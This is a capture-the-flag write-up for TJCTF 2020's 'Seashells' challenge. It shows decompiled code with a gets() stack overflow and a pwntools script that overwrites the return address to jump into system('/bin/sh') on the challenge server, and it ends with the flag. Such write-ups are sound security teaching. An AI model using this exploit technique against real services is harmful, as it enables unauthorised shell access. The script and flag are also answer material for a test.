# Seashells

> I heard there's someone selling shells? They seem to be out of stock
> though...  
>  
> nc p1.tjctf.org 8009

Attached is a binary.

## Description

First we use `checksec` to see which security features are enabled. There is
no PIE, nor canary, so exploit will probably be easy. Let's decompile the code
using Ghidra.

```c  
undefined8 main(void)  
{  
 int iVar1;  
 char local_12 [10];  
  
 setbuf(stdout,(char *)0x0);  
 setbuf(stdin,(char *)0x0);  
 setbuf(stderr,(char *)0x0);  
 puts("Welcome to Sally\'s Seashore Shell Shop");  
 puts("Would you like a shell?");  
 gets(local_12);  
 iVar1 = strcasecmp(local_12,"yes");  
 if (iVar1 == 0) {  
   puts("sorry, we are out of stock");  
 }  
 else {  
   puts("why are you even here?");  
 }  
 return 0;  
}  
```

So here is our buffer overflow: it only uses the `gets` function which
performs no boundary check.

Moreover, we see a function `shell`:

```c

void shell(long param_1)

{  
 if (param_1 == -0x2152350145414111) {  
   system("/bin/sh");  
 }  
 return;  
}  
```

Easily enough, we have the call to system. No PIE means we can know the
address of `shell` on the server, so the exploit is quite straightforward.

## Solution

With `gdb` we retrieve the address of the instructions corresponding to
`system("/bin/sh");` (we bypass the if statement), overflow the buffer and
jump there.

To find the offset, we also use gdb, filling the buffer with a cyclic pattern
and verify where we jump.

```python  
from pwn import *

sh = remote("p1.tjctf.org", 8009)

shell_addr = 0x00000000004006e3  
offset = 18

sh.recvuntil("hell?")  
payload = b'a'*offset + p64(shell_addr) + b'\x00'  
sh.sendline(payload)

sh.interactive()  
```

Flag: `tjctf{she_s3lls_se4_sh3ll5}`

Original writeup (https://github.com/apoirrier/CTFs-
writeups/blob/master/TJCTF2020/Pwn/Seeshells.md).